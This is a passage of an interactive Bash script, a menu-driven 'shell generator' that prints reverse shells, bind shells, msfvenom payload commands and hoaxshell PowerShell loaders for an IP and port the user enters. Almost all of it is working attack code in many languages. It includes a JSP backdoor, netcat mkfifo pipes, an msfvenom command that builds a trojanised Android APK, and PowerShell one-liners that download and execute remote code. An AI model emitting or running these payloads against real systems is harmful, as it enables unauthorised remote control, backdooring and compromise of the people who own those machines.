p=subprocess.Popen(["bash"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)

s2p_thread = threading.Thread(target=s2p, args=[s, p])
s2p_thread.daemon = True
s2p_thread.start()

p2s_thread = threading.Thread(target=p2s, args=[s, p])
p2s_thread.daemon = True
p2s_thread.start()

try:
    p.wait()
except KeyboardInterrupt:
    s.close()";;
         "Python3 shortest")
        echo "python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("$ip",$port));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'";;
         "Ruby #1")
         echo "ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("$ip",$port))'";;
        "Ruby no sh")
         echo "ruby -rsocket -e'exit if fork;c=TCPSocket.new("$ip","$port");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}'"#
         ;;
        "socat #1")
        echo "socat TCP:$ip:$port EXEC:bash";;
        "socat #2 (TTY)")
        echo "socat TCP:$ip:$port EXEC:'bash',pty,stderr,setsid,sigint,sane";;
        "sqlite3 nc mkfifo")
        echo "sqlite3 /dev/null '.shell rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc $ip $port >/tmp/f'";;
        "node.js")
        echo "require('child_process').exec('nc -e bash $ip $port')";;
            "node.js #2")
        echo "(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("bash", []);
    var client = new net.Socket();
    client.connect($port, "$ip", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application from crashing
})();";;
        "Java #1")
        echo "public class shell {
    public static void main(String[] args) {
        Process p;
        try {
            p = Runtime.getRuntime().exec("bash -c $@|bash 0 echo bash -i >& /dev/tcp/$ip/$port 0>&1");
            p.waitFor();
            p.destroy();
        } catch (Exception e) {}
    }
}";;
                "Java #2")
        echo "public class shell {
    public static void main(String[] args) {
        ProcessBuilder pb = new ProcessBuilder("bash", "-c", "$@| bash -i >& /dev/tcp/$ip/$port 0>&1")
            .redirectErrorStream(true);
        try {
            Process p = pb.start();
            p.waitFor();
            p.destroy();
        } catch (Exception e) {}
    }
}";;
                "Java #3")
        echo "import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class shell {
    public static void main(String[] args) {
        String host = "$ip";
        int port = $port;
        String cmd = "bash";
        try {
            Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
            Socket s = new Socket(host, port);
            InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
            OutputStream po = p.getOutputStream(), so = s.getOutputStream();
            while (!s.isClosed()) {
                while (pi.available() > 0)
                    so.write(pi.read());
                while (pe.available() > 0)
                    so.write(pe.read());
                while (si.available() > 0)
                    po.write(si.read());
                so.flush();
                po.flush();
                Thread.sleep(50);
                try {
                    p.exitValue();
                    break;
                } catch (Exception e) {}
            }
            p.destroy();
            s.close();
        } catch (Exception e) {}
    }
}";;
                "Java Web")
        echo "<%@
page import="java.lang.*, java.util.*, java.io.*, java.net.*"
% >
<%!
static class StreamConnector extends Thread
{
        InputStream is;
        OutputStream os;
        StreamConnector(InputStream is, OutputStream os)
        {
                this.is = is;
                this.os = os;
        }
        public void run()
        {
                BufferedReader isr = null;
                BufferedWriter osw = null;
                try
                {
                        isr = new BufferedReader(new InputStreamReader(is));
                        osw = new BufferedWriter(new OutputStreamWriter(os));
                        char buffer[] = new char[8192];
                        int lenRead;
                        while( (lenRead = isr.read(buffer, 0, buffer.length)) > 0)
                        {
                                osw.write(buffer, 0, lenRead);
                                osw.flush();
                        }
                }
                catch (Exception ioe)
                try
                {
                        if(isr != null) isr.close();
                        if(osw != null) osw.close();
                }
                catch (Exception ioe)
        }
}
%>

<h1>JSP Backdoor Reverse Shell</h1>

<form method="post">
IP Address
<input type="text" name="ipaddress" size=30>
Port
<input type="text" name="port" size=10>
<input type="submit" name="Connect" value="Connect">
</form>
<p>
<hr>

<%
String ipAddress = request.getParameter("ipaddress");
String ipPort = request.getParameter("port");
if(ipAddress != null && ipPort != null)
{
        Socket sock = null;
        try
        {
                sock = new Socket(ipAddress, (new Integer(ipPort)).intValue());
                Runtime rt = Runtime.getRuntime();
                Process proc = rt.exec("cmd.exe");
                StreamConnector outputConnector =
                        new StreamConnector(proc.getInputStream(),
                                          sock.getOutputStream());
                StreamConnector inputConnector =
                        new StreamConnector(sock.getInputStream(),
                                          proc.getOutputStream());
                outputConnector.start();
                inputConnector.start();
        }
        catch(Exception e) 
}
%>";;
               
                "Javascript")
        echo "(function(){ var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect(LPORT, "LHOST", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/; })();";;
                "Groovy")
        echo "String host="$ip";int port=$port;String cmd="bash";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();";;
                "telnet")
        echo "TF=$(mktemp -u);mkfifo $TF && telnet $ip $port 0<$TF | bash 1>$TF";;
                "zsh")
        echo "zsh -c 'zmodload zsh/net/tcp && ztcp $ip $port && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'";;
                "Lua #1")
        echo "lua -e require('socket');require('os');t=socket.tcp();t:connect('$ip','$port');os.execute('bash -i <&3 >&3 2>&3');";;
                "Lua #2")
        echo "lua5.1 -e 'local host, port = "$ip", $port local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'";;
            "TCLsh")
            echo "echo 'set s [socket LHOST LPORT];while 42 { puts -nonewline $s "shell>";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh";;
                "Golanguage")
        echo "echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","$ip:$port");cmd:=exec.Command("bash");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go";;
                "Awk")
        echo "awk 'BEGIN {s = "/inet/tcp/0/$ip/$port"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null";;
                "Dart")
        echo "import 'dart:io';
import 'dart:convert';

main() {
  Socket.connect("$ip", $port).then((socket) {
    socket.listen((data) {
      Process.start('bash', []).then((Process process) {
        process.stdin.writeln(new String.fromCharCodes(data).trim());
        process.stdout
          .transform(utf8.decoder)
          .listen((output) { socket.write(output); });
      });
    },
    onDone: () {
      socket.destroy();
    });
  });
}";;
                "Crystal (system)")
        echo "crystal eval 'require "process";require "socket";c=Socket.tcp(Socket::Family::INET);c.connect("$ip",$port);loop{m,l=c.receive;p=Process.new(m.rstrip("\n"),output:Process::Redirect::Pipe,shell:true);c<<p.output.gets_to_end}'";;
                "Crystal (code)")
        echo "require "process"
require "socket"

c = Socket.tcp(Socket::Family::INET)
c.connect("$ip", $port)
loop do 
  m, l = c.receive
  p = Process.new(m.rstrip("\n"), output:Process::Redirect::Pipe, shell:true)
  c << p.output.gets_to_end
end";;
            esac
            ;;
        "bind")
            case "$shell_name" in
                "Python3 Bind")
                    echo "python3 -c 'exec(\"import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind((\'0.0.0.0\',$port));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.send(p.stdout.read()+p.stderr.read())\")'"
                    ;;
                "PHP Bind")
                    echo "php -r '\$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind(\$s,\"0.0.0.0\",$port);socket_listen(\$s,1);\$cl=socket_accept(\$s);while(1){if(!socket_write(\$cl,\"$ \",2))exit;$in=socket_read(\$cl,100);popen(\"$in\",\"r\");}"
                    ;;
                "nc Bind")
                echo "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 0.0.0.0 $port > /tmp/f";;

            esac
            ;;
        "msfvenom")
            case "$shell_name" in
                "Windows Meterpreter Staged Reverse TCP (x64)")
                    echo "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f exe -o reverse_shell.exe"
                    ;;
                "Windows Meterpreter Stageless Reverse TCP (x64)" )
                    echo "msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ip LPORT=$port -f exe -o reverse.exe"
                    ;;  
                "Windwos Staged JSP Reverse TCP")
                    echo "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f jsp -o ./rev.jsp";;
                "Linux Meterpreter Staged Reverse TCP (x64)")
                    echo "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f elf -o reverse.elf";;
                "Linux Stageless Reverse TCP (x64)")
                    echo "msfvenom -p linux/x64/shell_reverse_tcp LHOST=$ip LPORT=$port -f elf -o reverse.elf";;
                "Bash Stageless Reverse TCP")
                    echo "msfvenom -p cmd/unix/reverse_bash LHOST=$ip LPORT=$port -f raw -o shell.sh";;
                "Python Stageless Reverse TCP")
                    echo "msfvenom -p cmd/unix/reverse_python LHOST=$ip LPORT=$port -f raw";;
                    "Apple iOS Meterpreter Reverse TCP Inline")
                    echo "msfvenom --platform apple_ios -p apple_ios/aarch64/meterpreter_reverse_tcp lhost=$ip lport=$port -f macho -o payload";;
                    "Android Meterpreter Embed Reverse TCP")
                    echo "msfvenom --platform android -x template-app.apk -p android/meterpreter/reverse_tcp lhost=$ip lport=$port -o payload.apk";;
                    "Android Meterpreter Reverse TCP")
                    echo "msfvenom --platform android -p android/meterpreter/reverse_tcp lhost=$ip lport=$port R -o malicious.apk";;
                    "WAR Stageless Reverse TCP")
                    echo "msfvenom -p java/shell_reverse_tcp LHOST=$ip LPORT=$port -f war -o shell.war";;
                    "JSP Stageless Reverse TCP")
                    echo "msfvenom -p java/jsp_shell_reverse_tcp LHOST=$ip LPORT=$port -f raw -o shell.jsp";;
                    "PHP Reverse PHP")
                    echo "msfvenom -p php/reverse_php LHOST=$ip LPORT=$port -o shell.php";;
                    "PHP Meterpreter Stageless Reverse TCP")
                    echo "msfvenom -p php/meterpreter_reverse_tcp LHOST=$ip LPORT=$port -f raw -o shell.php";;
                    "macOS Meterpreter Staged Reverse TCP (x64)")
                    echo "msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f macho -o shell.macho";;
            esac
            ;;
        "hoaxshell")
            case "$shell_name" in
                "Windows CMD cURL")
                    echo "@echo off&cmd /V:ON /C \"SET ip=$ip:$port&&SET sid=\"Authorization: eb6a44aa-8acc1e56-629ea455\"&&SET protocol=http://&&curl !protocol!!ip!/eb6a44aa -H !sid! > NUL && for /L %i in (0) do (curl -s !protocol!!ip!/8acc1e56 -H !sid! > !temp!cmd.bat & type !temp!cmd.bat | findstr None > NUL & if errorlevel 1 ((!temp!cmd.bat > !tmp!out.txt 2>&1) & curl !protocol!!ip!/629ea455 -X POST -H !sid! --data-binary @!temp!out.txt > NUL)) & timeout 1\" > NUL"
                    ;;
                "PowerShell IEX")
                    echo "powershell -e [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(\"IEX(New-Object Net.WebClient).DownloadString('http://$ip:$port')\"))"
                    ;;
                "PowerShell Outfile")
                    echo "$s='$ip:$port';$i='add29918-6263f3e6-2f810c1e';$p='http://';$f="C:Users$env:USERNAME.localhack.ps1";$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/add29918 -Headers @{"Authorization"=$i};while ($true){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/6263f3e6 -Headers @{"Authorization"=$i});if ($c -eq 'exit') {del $f;exit} elseif ($c -ne 'None') {echo "$c" | out-file -filepath $f;$r=powershell -ep bypass $f -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-RestMethod -Uri $p$s/2f810c1e -Method POST -Headers @{"Authorization"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}";;
            esac
            ;;
    esac
}

display_main_menu() {
    clear
    echo -e "${MAGENTA}╔══════════════════════════════════╗${RESET}"
    echo -e "${MAGENTA}║     ${CYAN}Advanced Shell Generator     ${MAGENTA}║${RESET}"
    echo -e "${MAGENTA}╚══════════════════════════════════╝${RESET}"
    echo -e "${YELLOW}1. ${GREEN}Reverse Shells${RESET}"
    echo -e "${YELLOW}2. ${GREEN}Bind Shells${RESET}"
    echo -e "${YELLOW}3. ${GREEN}MSFVenom Payloads${RESET}"
    echo -e "${YELLOW}4. ${GREEN}HoaxShell${RESET}"
    echo -e "${YELLOW}5. ${RED}Exit${RESET}"
}

select_shell() {
    local shells=("$@")
    local selected=0
    local page=0
    local page_size=20
    local total_pages=$((${#shells[@]} / page_size))
    local key

    while true; do
        clear
        echo -e "${BLUE}Use up/down arrows to navigate. Press Enter to select.${RESET}"
        echo -e "${BLUE}Use left/right arrows to change pages.${RESET}"
        echo -e "${YELLOW}Page $((page + 1))/$((total_pages + 1))${RESET}"
        
        local start=$((page * page_size))
        local end=$((start + page_size))
        [[ $end -gt ${#shells[@]} ]] && end=${#shells[@]}
        
        for i in $(seq $start $((end - 1))); do
            if [ $i -eq $selected ]; then
                echo -e "${YELLOW}=> ${GREEN}${shells[$i]}${RESET}"
            else
                echo -e "  ${CYAN}${shells[$i]}${RESET}"
            fi
        done

        read -s -n 3 key

        case "$key" in
            $'\e[A') 
                ((selected--))
                [[ $selected -lt $start ]] && selected=$((end - 1))
                ;;
            $'\e[B') 
                ((selected++))
                [[ $selected -ge $end ]] && selected=$start
                ;;
            $'\e[D')
                if ((page > 0)); then
                    ((page--))
                    selected=$((page * page_size))
                fi
                ;;
            $'\e[C') 
                if ((page < total_pages)); then
                    ((page++))
                    selected=$((page * page_size))
                fi
                ;;
            '') 
                echo "You selected: ${shells[$selected]}"
                generate_shell "$current_type" "${shells[$selected]}"
                read -p "Press any key to continue..."
                return
                ;;
        esac
    done
}

get_file_extension() {
    local shell_name=$1
    case "$shell_name" in
        php*|PHP*)
            echo "php";;
        node.js|Javascript*)
            echo "js";;
        Python*)
            echo "py"
            ;;
        PowerShell*|Windows*)
            echo "ps1"
            ;;
        Bash*|zsh*|socat*|nc*|telnet*|Awk*)
            echo "sh"
            ;;
        Java*)
            echo "java";;
        C*)
            echo "c"
            ;;
        msfvenom*)
            echo "rc"
            ;;
        *)
            echo "txt"
            ;;
    esac
}

generate_shell() {
    local shell_type=$1
    local shell_name=$2
    read -p "Enter IP address: " ip
    read -p "Enter port number: " port
    
    local shell_code=$(get_shell_code "$shell_type" "$shell_name")
    
 if [ -n "$shell_code" ]; then
    echo -e "${GREEN}Generating $shell_name shell...${RESET}"
    echo -e "${YELLOW}Shell command:${RESET}"
    echo -e "${CYAN}$shell_code${RESET}"
    
    extension=$(get_file_extension "$shell_name")
    
    # filename="${shell_name// /_}-reverse-shell.$extension"
    # echo "$shell_code" > "$filename"
    # echo -e "${GREEN}Shell command saved to $filename${RESET}"
else
    echo -e "${RED}Shell code not found for $shell_name${RESET}"
fi

}

while true; do
    display_main_menu
    read -p "Enter your choice: " choice

    case $choice in
        1)
            current_type="reverse"
            reverse_shells=(
                "Bash -i" "Bash 196" "Bash read line" "Bash 5" "Bash udp"
                "nc mkfifo" "nc -e" "nc.exe -e" "BusyBox nc -e" "nc -c"
                "ncat -e" "ncat.exe -e" "ncat udp" "curl" "rustcat"
                "C" "C Windows" "C# TCP Client" "C# Bash -i" "Haskell #1"
                "Perl" "Perl no sh" "PHP PentestMonkey" "PHP Ivan Sincek"
                "PHP cmd" "PHP cmd 2" "PHP cmd small" "PHP exec" "PHP shell_exec"
                "PHP system" "PHP passthru" "PHP" "PHP popen" 
                "Windows ConPty" "PowerShell #1" "PowerShell #2" "PowerShell #3" "PowerShell #4 (TLS)"
                "PowerShell #3 (Base64)" "Python #1" "Python #2" "Python3 #1" "Python3 #2"
                "Python3 Windows" "Python3 shortest" "Ruby #1" "Ruby no sh" "socat #1"
                "socat #2 (TTY)" "sqlite3 nc mkfifo" "node.js" "node.js #2" "Java #1"
                "Java #2" "Java #3" "Java Web"  "Javascript"
                "Groovy" "telnet" "zsh" "Lua #1" "Lua #2"
                "Golanguage"  "Awk" "Dart" "Crystal (system)"
                "Crystal (code)"
            )
            select_shell "${reverse_shells[@]}"
            ;;
        2)
            current_type="bind"
            bind_shells=("Python3 Bind" "PHP Bind" "nc Bind" )
            select_shell "${bind_shells[@]}"
            ;;
        3)
            current_type="msfvenom"
            msfvenom_payloads=(
                "Windows Meterpreter Staged Reverse TCP (x64)"
                "Windows Meterpreter Stageless Reverse TCP (x64)"
                "Windows Staged Reverse TCP (x64)"
                "Windows Stageless Reverse TCP (x64)"
                "Windows Staged JSP Reverse TCP"
                "Linux Meterpreter Staged Reverse TCP (x64)"
                "Linux Stageless Reverse TCP (x64)"
                "Windows Bind TCP ShellCode - BOF"
                "macOS Meterpreter Staged Reverse TCP (x64)"
                "macOS Meterpreter Stageless Reverse TCP (x64)"
                "macOS Stageless Reverse TCP (x64)"
                "PHP Meterpreter Stageless Reverse TCP"
                "PHP Reverse PHP"
                "JSP Stageless Reverse TCP"
                "WAR Stageless Reverse TCP"
                "Android Meterpreter Reverse TCP"
                "Android Meterpreter Embed Reverse TCP"
                "Apple iOS Meterpreter Reverse TCP Inline"
                "Python Stageless Reverse TCP"
                "Bash Stageless Reverse TCP"
            )
            select_shell "${msfvenom_payloads[@]}"
            ;;
        4)
            current_type="hoaxshell"
            hoaxshell=(
                "Windows CMD cURL" "PowerShell IEX" "PowerShell IEX Constr Lang Mode"
                "PowerShell Outfile" "PowerShell Outfile Constr Lang Mode"
                "PowerShell Outfile Constr Lang Mode https"
            )
            select_shell "${hoaxshell[@]}"
            ;;
        5)
            echo -e "${RED}Exiting...${RESET}"
            exit 0
            ;;
        *)
            echo -e "${RED}Invalid option. Please try again.${RESET}"
            read -p "Press any key to continue..."
            ;;
    esac
done
